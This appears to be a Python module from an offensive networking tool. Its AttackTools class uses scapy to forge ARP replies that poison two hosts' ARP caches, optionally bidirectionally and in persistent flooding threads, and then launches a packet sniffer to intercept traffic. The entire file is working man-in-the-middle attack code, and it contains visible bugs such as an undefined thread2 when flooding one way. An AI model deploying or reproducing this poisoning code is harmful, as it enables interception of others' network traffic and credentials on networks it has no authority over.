from scapy.layers.l2 import Ether, ARP
from scapy.all import *
from ARPPoisoner import ARPPoisoner
from DataStructures import *
from threading import Thread
from PacketSniffer import Sniffer


class AttackTools:
    @staticmethod
    def build_arp_response(attacker: Host, target1: Host, target2: Host):
        # TODO: Add error detection
        ether_index = 0
        arp_index = 1

        arp = Ether() / ARP()
        arp[ether_index].src = attacker.get_hwaddr()
        arp[arp_index].hwsrc = attacker.get_hwaddr()
        arp[arp_index].psrc = target1.get_addr()
        arp[arp_index].hwdst = target2.get_hwaddr()
        arp[arp_index].pdst = target2.get_addr()

        return arp

    @staticmethod
    def poison(attacker: Host, target1: Host, target2: Host, bidirectional: bool, flood: bool):
        arp1 = AttackTools.build_arp_response(attacker, target1, target2)
        if not flood:
            sendp(arp1, verbose=False)

        if bidirectional:
            arp2 = AttackTools.build_arp_response(attacker, target2, target1)
            if not flood:
                sendp(arp2, verbose=False)

        if flood:
            poisoners = [ARPPoisoner(arp1, target1, target2)]
            thread1 = Thread(target=poisoners[0].poison)
            thread1.start()

        if flood and bidirectional:
            poisoners.append(ARPPoisoner(arp2, target2, target1))
            thread2 = Thread(target=poisoners[1].poison)
            thread2.start()

        if flood:
            print("Poisoning targets...")
            thread1.join()
            thread2.join()
            threads = [Thread]
            for poisoner in poisoners:
                thread = Thread(target=poisoner.persistence)
                threads.append(thread)
                thread.start()
            print()
            print("Poisoning succeeded")

    @staticmethod
    def sniff(must_send: bool, interface: Interface, destination: Destination = None):
        sniffer = Sniffer(must_send, interface, destination)
        sniffer.begin_sniff()
        return sniffer


